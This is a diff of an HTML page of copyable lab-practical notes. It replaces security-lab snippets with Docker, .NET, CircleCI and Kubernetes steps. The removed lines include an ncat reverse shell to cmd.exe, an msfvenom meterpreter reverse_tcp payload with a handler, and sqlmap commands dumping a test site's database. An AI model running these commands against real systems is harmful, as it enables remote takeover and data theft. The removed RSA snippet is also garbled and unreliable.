@@ -56,88 +56,260 @@
 
 <body>
 
-    <button onclick="copyText(text1)">RSA</button>
-    <button onclick="copyText(text2)">IPconfig commands</button>
-    <button onclick="copyText(text3)">WireShark</button>
-    <button onclick="copyText(text4)">NCAT</button>
-    <button onclick="copyText(text5)">SQL Injection</button>
-    <button onclick="copyText(text6)">Putty SSH</button>
+    <button onclick="copyText(text1)">prc1 MVC Model</button>
+    <button onclick="copyText(text2)">prc2 Rest API(Web App)</button>
+    <button onclick="copyText(text3)">prc3 Working With Docker</button>
+    <button onclick="copyText(text4)">prc4 Installing s/w packages on docker </button>
+    <button onclick="copyText(text5)">prc5 docker volumes & networks</button>
+    <button onclick="copyText(text6)">prc6 Circle CI</button>
+    <button onclick="copyText(text7)">prc7 Backing Service </button>
+    <button onclick="copyText(text8)">prc8 Pie Diagram, Bar Chart Diagram</button>
     
     <p id="copiedMsg"></p>
     <script>
         var text1 = `
-from Crypto.PublibKey impoer RSA
-from Crypto import Random
-from Crypto.Cipher import PKCS1_v1_5
-random =random.new().read
-key=RSA.generate(4096,random)
-message=b'Your Message'
-cipher=PKCS1_v1_5.new(key)
-encrypted_message=cipher.encrypt(message)
-decrypted_message=cipher.decrypt(encrypted_message,None)
-print("Encrypted Message :",encrypted_message)
-print("Decrypted Message :",decrypted_message)
+Step 1: create a folder
+Step 2: create MVC project using “dotnet new mvc --auth none”(in cmd prmpt)
+Step 3: Go to controllers folder and modify HomeController.cs file
+
+namespace MyMVC.Controllers
+{
+ public class HomeController:Controller
+ {
+  public string Index()
+  {
+   return "Hello World";
+  }
+ }
+}
+
+Step 4: Run the project using “dotnet run”.(in cmd prmpt)
+Step 5: Go to Models folder and add new file StockQuote.cs to it with following content.
+
+using System;
+namespace MyMVC.Models
+{
+ public class StockQuote
+ {
+  public int Price {get;set;}
+  public string stockname {get;set;}
+ }
+}
+
+Step 6: Inside the Views folder edit Index.cshtml file
+
+@{
+  ViewData["Title"]="Your Name";
+}
+<div>
+  Stock Name:@Model.stockname</br>
+  Price:$@Model.Price
+</div>
+
+Step 7: Now modify HomeController.cs file to match following
+ namespace MyMVC.Controllers
+{
+ public class HomeController : Controller
+ {
+  public async Task<IActionResult> Index()
+ {
+   var model=new StockQuote{stockName="Your Name",Price=100};
+   return View(model);
+ }
+ }
+}
+
+Step 8: Run the project using dotnet run
 `;
 
         var text2 = `
-step 1:ipconfig
-step 2:ipconfig/all
-step 3:pconfig /displaydns
-step 4:ipconfig /flushdns
-step 5: wmic os get osarchitecture
+Step 1: Open two command prompts
+Command prompt 1: Command: dotnet new webapi -o Glossary
+Command Prompt 2: Command: curl --insecure https://localhost:5001/weatherforecast
+
+Step 2: To get started, remove the WeatherForecast.cs file from the root 
+of the project and the WeatherForecastController.cs file from the Controllers folder. Add 
+Following two files
+1) D:\Glossary\GlossaryItem.cs (type it in notepad and save as all files)
+2) D:\Glossary\Controllers\ GlossaryController.cs (type it in notepad and save as all files)
+
+Step 3: Now stop running previous dotnet run on 
+command prompt 1 using Ctrl+C. and Run it again for new code. 
+On Command prompt1:dotnet run
+On Command prompt2: Getting a list of items: Command: curl --insecure http://localhost:5176/api/glossary
+
+1.Getting a single item:
+Command: curl --insecure https://localhost:5001/api/glossary/MVC
+
+2.Creating an item:
+Command: curl --insecure -X POST -d "{\"term\": \"MFA\", \"definition\":\"An authentication process.\"}" -H 
+"Content-Type:application/json" http://localhost:5227/api/glossary
+
+3.Update Item:
+Command: curl --insecure -X PUT -d "{\"term\": \"MVC\", \"definition\":\"Modified record of Model 
+View Controller.\"}" -H "Content-Type:application/json" http://localhost:5227/api/glossary
+
+4.Delete Item:
+Command: curl --insecure --request DELETE --url http://localhost:5227/api/glossary/openid
 
 `;
         var text3 = `
-Step 1:Start capturing in wireshark
-Step 2:Open this link  http://testphp.vulnweb.com/login.php
-Step 3:stop Capturing 
-Step 4: input "http" to display all packets related to the HTTP protocol.
-Step 5: http.request.method=="POST"
+Method 1: To pull and push images using docker
+1.To check docker version: docker –-version 
+2.To pull readymade image: docker pull rocker/verse
+3.To check images in docker: docker images
+
+4.Login to docker hub and create repository using below mentioned link.
+Link: https://hub.docker.com/
+
+5.Command To login to your docker account: docker login –u <username> 
+password: (docker hub > ID > My Account > Security > Create an Access Token)
+
+6.Command to push image to docker hub account: docker push <username>/<repository name>:<Tag name>
+
+7.Check it in docker hub now.
+
+Method 2: Build an image then push it to docker and run it.
+
+1.Command to create docker file:
+cat > Dockerfile <<EOF 
+FROM busybox 
+CMD echo "Hello world! This is my first Docker image." 
+EOF 
+
+2.Command to build image from docker file: docker build -t <username>/<repository name>
+
+3.docker images 
+
+4.Command to push image to docker hub: docker push <username>/<repository name>
+
+5.Command to run docker image: docker run <username>/<repository name> 
+
 `;
 
         var text4 = `
-Part A Reverse Shell on windows
-Step 1:ufw disable
-Step 2:nc -lvp 4444
-Step 3:ncat -nv 192.168.100.144 4444 -e cmd.exe(execute on windows cmd prmt)
-Step 4:nc -lvp 4444
+Step 1: Go to CLI Option on the container in Docker Desktop
+Step 2: apt-get -y update 
+Step 3: apt-get -y install firefox
+        apt-get -y install vim
 
-Part B Reverse shell with payload
-Step 1:msfconsole
-Step 2:msfvenom
-Step 3:msfvenom -p/windows/meterpreter/reverse_tcp LHOST=192.168.100.144 LPORT=4444 -f exe>/home/desktop/shallcode/reverse_tcp.exe
-Step 4:python3 -m http.server
-Step 5:use exploite
-Step 6:use exploite/multi/handler
-Step 7:set payload windows/meterpreter/reverse_tcp
-Step 8:set lhost 192.168.100.144
-Step 9:set lport 4444
-Step 10:exploit
-Step 11:python3 -m http.server
-Step 12:ls
-
+Step 4: Run vim to verify if the software package has been installed
+Working with Docker Volumes:
+1.creating volume (docker volume create myvol)
+2.listing volumes (docker volume ls)
+3.getting details of our volume (docker volume inspect myvol)
+4.removing volume (docker volume rm myvol)
 `;
 
         var text5 = `
-Step 1:sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
-Step 2:sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
-Step 3:sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
-Step 4:sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump
+Step 1
+a) docker pull nginx – nginx 
+b) docker run -it –name=webApp -d -p 80:80 nginx
+
+Step 2: Click on Port and enter 80 in the dropdown window and click OK
+
+Step 3: 
+docker exec -it WebApp bash
+Cd /usr/share/nginx/html
+Echo “Hello Welcome to updated nginx Page.”> index.html
+exit
+
+Step 4: docker ps
+
+Step 5: 
+Docker run -it –name=WebApp1 -d -p 80:80 nginx
+
+Step 6: Click on port and enter 80 in the dropdown and click ok
+
+Step 7: Creation of Volume(MyVolume)
+Command:
+a) docker volume create MyVolume
+b) docker volume ls
+c) docker volume inspect MyVolume
+d) docker stop WebApp1
+
+Step 8: Create a container (WebApp2) inside the container MyVolume
+docker run -d –name = WebApp2 –mount 
+source=MyVolume,destination=/usr/share/nginx/html –p 80:80 nginx
+
+Step 9: Enter the below commands:
+a) ls /
+b) cd /var/lib/docker
+c) ls
+d) cd volumes
+e) ls
+f) cd MyVolume
+g) ls
+h) cd _data
+
 `;
 
         var text6 = `
-Step 1: Service ssh start 
-Step 2:ufw status
-Step 3:open putty and enter ipaddress of ur kali 
-Step 4: Login by entering credential
-Step 5: sudo su (Escalate the user from normal user to root user)
-Step 6: cd SSH_Connection/
-Step 7: cat txtforssh.txt (enter some random text)
-Step 8: cat >>txtforssh.txt
-Stpe 9: cat txtforssh.txt
+Step-1: - Let's initiate the process with these fundamental steps: Log in to GitHub. & Create a public 
+repository named Sabar, ensuring to include a README file.
+
+Step-2: Login to Circle ci with GitHub login & Navigate to Projects tab where you will find the repositories you have created. Once you find the hello-world repository click on setup project.
+
+Step-3: Select Faster and click on setup project.
+
+Step-4:"In GitHub, navigate to the 'hello-world' repository, then proceed to the 'circlrci-project' branch and open the 'config.yml' file."
+
+Step-5: Edit the config file and commit changes
+
+Step-6: We can now see that the updates from GitHub are being logged, and the message is being recorded for 
+smooth integration.
+
+
 
 `;
 
+        var text7 = `
+
+Step 1: docker run -d -p 5000:5000 -e PORT=5000 \-e LOCATION
+URL=http://localhost:5001 \dotnetcoreservices/teamservice:location
+
+Step 2:to run location service 
+docker run -d -p 5001:5001 -e PORT=5001 dotnetcoreservices/locationservice:nodb
+
+
+Step 3: : to check running images in docker $docker images
+
+Step 4:to create new team
+curl -H "Content-Type:application/json" -X POST -d \'{"id":"e52baa63-d511-
+417e-9e54-7aab04286281", "name":"KC"}' http://localhost:5000/teams
+
+Step 5: To confirm that team is added
+curl http://localhost:5000/teams/e52baa63-d511-417e-9e54-7aab04286281
+
+Step 6: to add new member to team
+curl -H "Content-Type:application/json" -X POST -d \'{"id":"63e7acf8-8fae42ce-9349-3c8593ac8292", "firstName":"Kirti", "lastName":"Bhatt"}'
+http://localhost:5000/teams/e52baa63-d511-417e-9e54-
+7aab04286281/members
+
+Step 7: To confirm member added
+curl http://localhost:5000/teams/e52baa63-d511-417e-9e54-7aab04286281
+
+Step 8: To add location for member
+curl -H "Content-Type:application/json" -X POST -d \'{"id":"64c3e69f-1580-
+4b2f-a9ff-2c5f3b8f0e1f", "latitude":12.0,"longitude":12.0,"altitude":10.0,
+"timestamp":0,"memberId":"63e7acf8-8fae-42ce-9349-3c8593ac8292"}'
+http://localhost:5001/locations/63e7acf8-8fae-42ce-9349-3c8593ac8292
+
+
+`;
+
+        var text8 = `
+1.to inspect the available nodes in the cluster: 
+  cmd: kubectl get nodes 
+2.to observe the list of running pods: 
+  cmd: kubectl get pods
+3.to examine the available services within the cluster: 
+  cmd: kubectl get services
+
+
+`;
+
+        
         function copyText(text) {
             navigator.clipboard.writeText(text).then(function () {
                 document.getElementById('copiedMsg').innerHTML = "Text Copied"
@@ -150,3 +322,6 @@ Stpe 9: cat txtforssh.txt
 </body>
 
 </html>
+
+
+
